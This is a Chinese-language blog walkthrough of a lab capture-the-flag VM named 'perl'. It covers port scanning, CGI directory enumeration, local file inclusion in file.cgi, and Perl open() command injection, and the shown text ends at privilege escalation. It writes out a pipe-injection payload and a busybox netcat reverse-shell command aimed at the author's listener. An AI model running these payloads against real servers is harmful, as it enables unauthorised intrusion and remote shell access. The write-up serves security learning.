@@ -1,0 +1,518 @@
+<!doctype html>
+<html lang="zh"><head>
+<title>群友靶机--perl - X8@0E的博客</title>
+<meta charset="UTF-8">
+<meta name="keywords" content="">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+<meta name="description" content="一.信息收集1.主机发现与端口扫描首先在本地网络中使用 arp-scan 发现目标主机IP，随后利用 nmap 对其进行全端口扫描，以识别开放的服务。 主机发现: 端口扫描： 扫描结果表明，靶机IP为 192.168.56.8，开放了 22 (SSH) 和 80 (HTTP) 端口。 2.Web服务侦察访问80端口，发现是一个关于Perl语言的静态页面。查看页面源代码，在其中发现一条关键线索。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="群友靶机--perl">
+<meta property="og:url" content="http://example.com/2025/08/11/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA--perl/index.html">
+<meta property="og:site_name" content="X8@0E的博客">
+<meta property="og:description" content="一.信息收集1.主机发现与端口扫描首先在本地网络中使用 arp-scan 发现目标主机IP，随后利用 nmap 对其进行全端口扫描，以识别开放的服务。 主机发现: 端口扫描： 扫描结果表明，靶机IP为 192.168.56.8，开放了 22 (SSH) 和 80 (HTTP) 端口。 2.Web服务侦察访问80端口，发现是一个关于Perl语言的静态页面。查看页面源代码，在其中发现一条关键线索。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250812173252875.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250812173338011.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250812173817674.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250812174637030.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250812174839257.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250812175037235.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250812175126486.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250812180006468.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250812175336733.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250812175718034.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250812180309185.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250812180605216.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250812180551732.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250812180639273.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250812181105603.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250812181454301.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250812181750219.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250812181950409.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250812182309473.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250812182417525.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250812182605862.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250812182818708.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250812182924576.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250812183130712.png">
+<meta property="article:published_time" content="2025-08-11T12:31:56.262Z">
+<meta property="article:modified_time" content="2025-08-13T05:43:44.044Z">
+<meta property="article:author" content="X8@0E">
+<meta property="article:tag" content="cgi文件">
+<meta property="article:tag" content="LFI到RCE(open函数)">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250812173252875.png">
+
+<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
+<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
+
+
+<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1761989925378">
+
+<link rel="stylesheet" href="/css/style.css?v=1761989925378">
+
+
+
+
+    
+        <link rel="stylesheet" href="/custom.css?v=1761989925378">
+    
+
+
+
+<script src="/lib/mdui_043tiny/mdui.js" async></script>
+<script src="/lib/fancybox/fancybox.umd.js" async></script>
+<script src="/lib/lax.min.js" async></script>
+
+
+<script async src="/js/app.js?v=1761989925378"></script>
+
+ 
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4D4ZJ9G024"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag("js", new Date());
+
+  gtag("config", "G-4D4ZJ9G024");
+</script>
+
+
+<link rel="stylesheet"  href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/atom-one-dark.min.css">
+<meta name="generator" content="Hexo 7.3.0"></head><body class="nexmoe mdui-drawer-body-left"><div id="nexmoe-background"><div class="nexmoe-bg" style="background-image: url(https://img-baofun.zhhainiao.com/pcwallpaper_ugc/static/55f0c32a6a773efe8c6a6a8158a06f18.jpg?x-oss-process=image%2fresize%2cm_lfit%2cw_1920%2ch_1080)"></div><div class="mdui-appbar mdui-shadow-0"><div class="mdui-toolbar"><a class="mdui-btn mdui-btn-icon mdui-ripple" mdui-drawer="{target: &#039;#drawer&#039;, swipe: true}" title="menu"><i class="mdui-icon nexmoefont icon-menu"></i></a><div class="mdui-toolbar-spacer"></div><a class="mdui-btn mdui-btn-icon" href="/" title="X8@0E"><img src="https://n.sinaimg.cn/sinakd20119/560/w1080h1080/20220924/802a-0c9750f1fa5aa25624c0847a082aaba1.jpg" alt="X8@0E"></a></div></div></div><div id="nexmoe-header"><div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="X8@0E">
+            <img src="https://n.sinaimg.cn/sinakd20119/560/w1080h1080/20220924/802a-0c9750f1fa5aa25624c0847a082aaba1.jpg" alt="X8@0E" alt="X8@0E">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>43</div>
+        <div><span>标签</span>77</div>
+        <div><span>分类</span>14</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archives.html" title="文章归档">
+            <i class="mdui-list-item-icon nexmoefont icon-douban-fill"></i>
+            <div class="mdui-list-item-content">
+                文章归档
+            </div>
+        </a>
+        
+    </div>
+    
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+        
+            <form id="search_form">
+                <label><input class="st-default-search-input" id="search_value" name="q" type="search" placeholder="搜索" style="
+                    font-size: 15px !important;
+                    height: 56px !important;
+                    background-image: none;
+                "></label>
+            </form>
+         
+    </div>
+</div>
+
+
+	<script async src="/js/search.js?v=1761989925379"></script>
+
+
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+	<div class="nexmoe-widget nexmoe-social">
+		<a
+			class="mdui-ripple"
+			href="https://blog.csdn.net/2301_81325456/article/details/147025965"
+			target="_blank"
+			mdui-tooltip="{content: 'CSDN'}"
+			style="
+				color: rgb(247, 132, 34);
+				background-color: rgba(247, 132, 34, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-github"
+			></i> </a
+		>
+	</div>
+</div>
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章分类</h3>
+    <div class="nexmoe-widget">
+
+      <ul class="category-list">
+
+        
+
+
+        
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Crypto/">Crypto</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/NSSCTF/">NSSCTF</a>
+          <span class="category-list-count">2</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Vulnhub/">Vulnhub</a>
+          <span class="category-list-count">3</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Vulnvm靶机复现/">Vulnvm靶机复现</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/ctfshow-web-信息收集/">ctfshow-web-信息收集</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/ctfshow-web-命令执行/">ctfshow-web-命令执行</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/ctfshow-web-文件上传/">ctfshow-web-文件上传</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/ctfshow-web-文件包含/">ctfshow-web-文件包含</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/ctfshow-web-爆破/">ctfshow-web-爆破</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/sql注入/">sql注入</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/vulhub/">vulhub</a>
+          <span class="category-list-count">7</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/vulnhub/">vulnhub</a>
+          <span class="category-list-count">4</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/群友靶机/">群友靶机</a>
+          <span class="category-list-count">15</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/自制靶机/">自制靶机</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+      </ul>
+
+    </div>
+  </div>
+
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
+      <a href="/tags/1Panel/" style="font-size: 10px;">1Panel</a> <a href="/tags/3%E4%B8%AA%E7%82%B9/" style="font-size: 10px;">3个点</a> <a href="/tags/Argon2Cracker/" style="font-size: 10px;">Argon2Cracker</a> <a href="/tags/Cookie-GLOBALS/" style="font-size: 10px;">Cookie--GLOBALS</a> <a href="/tags/Cypher%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">Cypher注入</a> <a href="/tags/DC/" style="font-size: 15px;">DC</a> <a href="/tags/GIF%E7%BB%95%E8%BF%87/" style="font-size: 10px;">GIF绕过</a> <a href="/tags/Jinja2/" style="font-size: 10px;">Jinja2</a> <a href="/tags/JoomScan/" style="font-size: 10px;">JoomScan</a> <a href="/tags/LFI%E5%88%B0RCE-open%E5%87%BD%E6%95%B0/" style="font-size: 10px;">LFI到RCE(open函数)</a> <a href="/tags/NSSCTF/" style="font-size: 15px;">NSSCTF</a> <a href="/tags/Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">Nginx解析漏洞</a> <a href="/tags/RSA/" style="font-size: 10px;">RSA</a> <a href="/tags/RUNPATH/" style="font-size: 10px;">RUNPATH</a> <a href="/tags/Rabbit/" style="font-size: 10px;">Rabbit</a> <a href="/tags/SSRF/" style="font-size: 10px;">SSRF</a> <a href="/tags/Vulnhub/" style="font-size: 15px;">Vulnhub</a> <a href="/tags/Vulnvm/" style="font-size: 10px;">Vulnvm</a> <a href="/tags/WAF/" style="font-size: 10px;">WAF</a> <a href="/tags/WPA-01-cap/" style="font-size: 10px;">WPA-01.cap</a> <a href="/tags/aircrack-ng/" style="font-size: 10px;">aircrack-ng</a> <a href="/tags/basic%E8%AE%A4%E8%AF%81%E7%88%86%E7%A0%B4/" style="font-size: 10px;">basic认证爆破</a> <a href="/tags/cgi%E6%96%87%E4%BB%B6/" style="font-size: 10px;">cgi文件</a> <a href="/tags/ctfshow/" style="font-size: 20px;">ctfshow</a> <a href="/tags/dirtycow/" style="font-size: 10px;">dirtycow</a> <a href="/tags/docker%E4%BA%A4%E4%BA%92%E5%BC%8Fshell/" style="font-size: 10px;">docker交互式shell</a> <a href="/tags/drupal/" style="font-size: 10px;">drupal</a> <a href="/tags/ffuf/" style="font-size: 10px;">ffuf</a> <a href="/tags/flask/" style="font-size: 10px;">flask</a> <a href="/tags/fork%E8%A7%A3%E5%86%B3%E6%96%AD%E8%BF%9E/" style="font-size: 10px;">fork解决断连</a> <a href="/tags/ftp/" style="font-size: 10px;">ftp</a> <a href="/tags/ghfs/" style="font-size: 10px;">ghfs</a> <a href="/tags/ldd/" style="font-size: 10px;">ldd</a> <a href="/tags/les-sh/" style="font-size: 10px;">les.sh</a> <a href="/tags/linpeas-sh/" style="font-size: 10px;">linpeas.sh</a> <a href="/tags/lsattr-%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%B1%9E%E6%80%A7/" style="font-size: 10px;">lsattr--查看文件扩展属性</a> <a href="/tags/motto/" style="font-size: 10px;">motto</a> <a href="/tags/msfvenom/" style="font-size: 15px;">msfvenom</a> <a href="/tags/mysql-old-password/" style="font-size: 10px;">mysql_old_password</a> <a href="/tags/nikto/" style="font-size: 10px;">nikto</a> <a href="/tags/nohup/" style="font-size: 10px;">nohup</a> <a href="/tags/php%E6%8F%90%E6%9D%83root/" style="font-size: 10px;">php提权root</a> <a href="/tags/poc/" style="font-size: 10px;">poc</a> <a href="/tags/put%E6%96%B9%E6%B3%95/" style="font-size: 10px;">put方法</a> <a href="/tags/python3-5/" style="font-size: 10px;">python3.5</a> <a href="/tags/rce/" style="font-size: 10px;">rce</a> <a href="/tags/readelf/" style="font-size: 10px;">readelf</a> <a href="/tags/scp/" style="font-size: 10px;">scp</a> <a href="/tags/sqlmap/" style="font-size: 10px;">sqlmap</a> <a href="/tags/sql%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">sql二次注入</a> <a href="/tags/ssh%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4/" style="font-size: 10px;">ssh弱口令爆破</a> <a href="/tags/ssh%E7%A7%98%E9%92%A5%E7%94%9F%E6%88%90%E8%BF%9E%E6%8E%A5/" style="font-size: 10px;">ssh秘钥生成连接</a> <a href="/tags/stegseek/" style="font-size: 10px;">stegseek</a> <a href="/tags/suForce/" style="font-size: 10px;">suForce</a> <a href="/tags/url%E6%88%AA%E6%96%AD/" style="font-size: 10px;">url截断</a> <a href="/tags/vite/" style="font-size: 10px;">vite</a> <a href="/tags/web%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 10px;">web命令执行</a> <a href="/tags/web%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">web文件上传</a> <a href="/tags/web%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 10px;">web文件包含</a> <a href="/tags/web%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/" style="font-size: 10px;">web源码泄露</a> <a href="/tags/web%E7%88%86%E7%A0%B4/" style="font-size: 10px;">web爆破</a> <a href="/tags/x-forwarded-for%E7%9A%84ip%E6%AC%BA%E9%AA%97/" style="font-size: 10px;">x-forwarded-for的ip欺骗</a> <a href="/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2025-30208/" style="font-size: 10px;">任意文件读取漏洞(CVE-2025-30208)</a> <a href="/tags/%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81/" style="font-size: 10px;">凯撒密码</a> <a href="/tags/%E5%90%8E%E9%9D%A2%E5%8A%A0-jpg%E5%90%8E%E7%BC%80/" style="font-size: 10px;">后面加.jpg后缀</a> <a href="/tags/%E5%9F%9F%E6%8E%A7/" style="font-size: 10px;">域控</a> <a href="/tags/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/" style="font-size: 10px;">密码爆破</a> <a href="/tags/%E6%8F%90%E6%9D%83-env-reset/" style="font-size: 10px;">提权!env_reset</a> <a href="/tags/%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">插件漏洞</a> <a href="/tags/%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5-ua%E6%B7%BB%E5%8A%A0%E6%9C%A8%E9%A9%AC/" style="font-size: 10px;">日志注入+ua添加木马</a> <a href="/tags/%E6%AD%A3%E5%90%91shell/" style="font-size: 10px;">正向shell</a> <a href="/tags/%E7%8A%B6%E6%80%81%E7%A0%81/" style="font-size: 10px;">状态码</a> <a href="/tags/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/" style="font-size: 10px;">环境变量</a> <a href="/tags/%E7%A9%BA%E6%A0%BC/" style="font-size: 10px;">空格</a> <a href="/tags/%E7%BB%B4%E5%90%89%E5%B0%BC%E4%BA%9A%E5%AF%86%E7%A0%81/" style="font-size: 10px;">维吉尼亚密码</a> <a href="/tags/%E8%9A%81%E5%89%91/" style="font-size: 10px;">蚁剑</a> <a href="/tags/%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96/" style="font-size: 10px;">越界读取</a>
+    </div>
+    
+      <script>
+        var maxTagcloud = parseInt(17);
+        var tags_length = parseInt(77);
+        var tags_arr = [];
+        for(var i = 0; i < tags_length; i++){
+          tags_arr.push(i);
+        }
+        tags_arr.sort(function (l, r) {
+          return Math.random() > 0.5 ? -1 : 1;
+        });
+        tags_arr = tags_arr.slice(0, maxTagcloud < tags_length ? tags_length - maxTagcloud : 0);
+        for(var tag_i = 0; tag_i < tags_arr.length; tag_i++){
+          document.getElementById("randomtagcloud").children[tags_arr[tag_i]].style.display = 'none';
+        }
+      </script>
+    
+  </div>
+
+    
+        
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章归档</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/">2025</a><span class="archive-list-count">43</span></li></ul>
+    </div>
+  </div>
+
+
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">最新文章</h3>
+    <div class="nexmoe-widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/10/20/Crypto/">Crypto</a>
+          </li>
+        
+          <li>
+            <a href="/2025/10/11/%E6%B5%81%E9%87%8F%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/">流量分析恶意攻击</a>
+          </li>
+        
+          <li>
+            <a href="/2025/10/10/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">流量分析</a>
+          </li>
+        
+          <li>
+            <a href="/2025/10/09/hackableII/">hackablell</a>
+          </li>
+        
+          <li>
+            <a href="/2025/10/07/Me-and-My-Girlfriend-1/">Me-and-My-Girlfriend-1</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-link">
+		<ul>
+        
+            <li>
+                <a href="" target="_blank" >
+                    <img src="https://n.sinaimg.cn/sinakd20119/560/w1080h1080/20220924/802a-0c9750f1fa5aa25624c0847a082aaba1.jpg" alt="X8@0E"></img>
+                    <p>X8@0E</p>
+                </a>
+            </li>
+        
+		</ul>
+    </div>
+</div>
+<style>
+.nexmoe-widget-wrap .nexmoe-link ul li a {
+    text-align : center;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a img {
+    max-width : 100%;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a p {
+    margin: 10px 0;
+}
+</style>
+
+    
+   
+    <div class="nexmoe-copyright">
+        &copy; 2025 X8@0E
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+        
+    </div>
+</div><!-- .nexmoe-drawer --></div><div id="nexmoe-content"><div class="nexmoe-primary"><div class="nexmoe-post">
+  <article>
+    
+        <div class="nexmoe-post-cover absolute" style="padding-top: NaN%;"> 
+            <img src="https://pic4.zhimg.com/v2-b730c73ebd78bd5f22293aab0d343f4b_r.jpg?source=1940ef5c" alt="群友靶机--perl" loading="lazy">
+            <h1>群友靶机--perl</h1>
+        </div>
+    
+    
+    <div class="nexmoe-post-meta">
+    <div class="nexmoe-rainbow">
+        <a class="nexmoefont icon-calendar-fill">2025年08月11日</a>
+        
+            <a class="nexmoefont icon-appstore-fill -link" href="/categories/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA/">群友靶机</a>
+        
+        
+    </div>
+    
+    
+    
+    
+    
+</div>
+
+    <h1 id="一-信息收集"><a href="#一-信息收集" class="headerlink" title="一.信息收集"></a>一.信息收集</h1><h2 id="1-主机发现与端口扫描"><a href="#1-主机发现与端口扫描" class="headerlink" title="1.主机发现与端口扫描"></a>1.主机发现与端口扫描</h2><p>首先在本地网络中使用 arp-scan 发现目标主机IP，随后利用 nmap 对其进行全端口扫描，以识别开放的服务。</p>
+<h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现:"></a>主机发现:</h3><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250812173252875.png" alt="image-20250812173252875" data-caption="image-20250812173252875" loading="lazy"></p>
+<h3 id="端口扫描："><a href="#端口扫描：" class="headerlink" title="端口扫描："></a>端口扫描：</h3><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250812173338011.png" alt="image-20250812173338011" data-caption="image-20250812173338011" loading="lazy"></p>
+<p>扫描结果表明，靶机IP为 192.168.56.8，开放了 <strong>22 (SSH)</strong> 和 <strong>80 (HTTP)</strong> 端口。</p>
+<h2 id="2-Web服务侦察"><a href="#2-Web服务侦察" class="headerlink" title="2.Web服务侦察"></a>2.Web服务侦察</h2><p>访问80端口，发现是一个关于Perl语言的静态页面。查看页面源代码，在其中发现一条关键线索。</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250812173817674.png" alt="image-20250812173817674" data-caption="image-20250812173817674" loading="lazy"></p>
+<p>HTML注释中出现的 cgi 强烈暗示Web服务上可能存在CGI脚本，这通常是Web应用的一个重要攻击面。</p>
+<h1 id="二、漏洞发现与初始访问"><a href="#二、漏洞发现与初始访问" class="headerlink" title="二、漏洞发现与初始访问"></a>二、漏洞发现与初始访问</h1><h2 id="1-CGI目录与文件扫描"><a href="#1-CGI目录与文件扫描" class="headerlink" title="1.CGI目录与文件扫描"></a>1.CGI目录与文件扫描</h2><p>根据上一步的线索，我们重点对CGI相关目录进行扫描。使用 gobuster 发现 &#x2F;cgi-bin&#x2F; 目录(这个需要针对cgi特定的字典扫描)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://192.168.56.8/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x cgi,pl,shtml</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250812174637030.png" alt="image-20250812174637030" data-caption="image-20250812174637030" loading="lazy"></p>
+<p>再用gobuster 对 &#x2F;cgi-bin&#x2F; 目录进行深度扫描，成功发现一个可疑的CGI脚本。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://192.168.56.8/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x cgi,pl,shtml</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250812174839257.png" alt="image-20250812174839257" data-caption="image-20250812174839257" loading="lazy"></p>
+<p>扫描找到了 file.cgi 文件，这是我们的主要突破口。</p>
+<h2 id="2-LFI到-RCE-Perl-open-函数漏洞"><a href="#2-LFI到-RCE-Perl-open-函数漏洞" class="headerlink" title="2.LFI到 RCE (Perl open 函数漏洞)"></a>2.LFI到 RCE (Perl open 函数漏洞)</h2><p>对发现的 file.cgi 进行参数模糊测试，发现一个 file 参数存在本地文件包含 (LFI) 漏洞。</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250812175037235.png" alt="image-20250812175037235" data-caption="image-20250812175037235" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250812175126486.png" alt="image-20250812175126486" data-caption="image-20250812175126486" loading="lazy"></p>
+<p>法一：可以直接读取user的flag</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250812180006468.png" alt="image-20250812180006468" data-caption="image-20250812180006468" loading="lazy"></p>
+<p>成功读取 &#x2F;etc&#x2F;passwd 文件。利用此漏洞读取 file.cgi 自身的源代码。(读取自身的源代码这一步很重要)</p>
+<p>法二：</p>
+<p>源码审计：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;192.168.56.8/cgi-bin/file.cgi?file=file.cgi&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250812175336733.png" alt="image-20250812175336733" data-caption="image-20250812175336733" loading="lazy"></p>
+<p>源码的核心问题在于 open(FILE, $input); 。在Perl中，这种双参数的 open 函数非常危险。当传递的参数以管道符 | 结尾时，Perl会将其后的字符串作为命令来执行。这使我们能够将LFI漏洞直接升级为远程代码执行 (RCE) 漏洞。</p>
+<h2 id="3-获取-www-data-Shell"><a href="#3-获取-www-data-Shell" class="headerlink" title="3.获取 www-data Shell"></a>3.获取 www-data Shell</h2><p>验证RCE漏洞:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;192.168.56.8/cgi-bin/file.cgi?file=|id&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250812175718034.png" alt="image-20250812175718034" data-caption="image-20250812175718034" loading="lazy"></p>
+<p>成功执行 id 命令。接下来，构造反弹Shell的Payload，在本地开启监听，成功获取 www-data 用户的交互式Shell。</p>
+<p>kali本地监听：</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250812180309185.png" alt="image-20250812180309185" data-caption="image-20250812180309185" loading="lazy"></p>
+<p>构造并执行Payload:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;192.168.56.8/cgi-bin/file.cgi?file=|busybox+nc+192.168.56.3+1234+-e+/bin/bash&#x27;</span></span><br><span class="line">//使用busybox中的nc（netcat）工具，连接到IP地址192.168.56.3的1234端口，并将/bin/bash绑定到该连接上（即反弹一个shell）。在原始命令中，我们看到空格被替换为<span class="string">&#x27;+&#x27;</span>，这是URL编码中空格的一种表示方式。</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250812180605216.png" alt="image-20250812180605216" data-caption="image-20250812180605216" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250812180551732.png" alt="image-20250812180551732" data-caption="image-20250812180551732" loading="lazy"></p>
+<p>获取Shell并稳定TTY:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script /dev/null -c bash  //使用script稳定Shell</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250812180639273.png" alt="image-20250812180639273" data-caption="image-20250812180639273" loading="lazy"></p>
+<h1 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h1><h2 id="1-www-data-sunset"><a href="#1-www-data-sunset" class="headerlink" title="1.www-data -&gt; sunset"></a>1.www-data -&gt; sunset</h2><p>在获取 www-data 权限后，对系统进行信息搜集。一般要退回到根目录查找文件，看到opt目录。</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250812181105603.png" alt="image-20250812181105603" data-caption="image-20250812181105603" loading="lazy"></p>
+<p>在 &#x2F;opt 目录下发现一个可疑的Perl脚本password.pl 。</p>
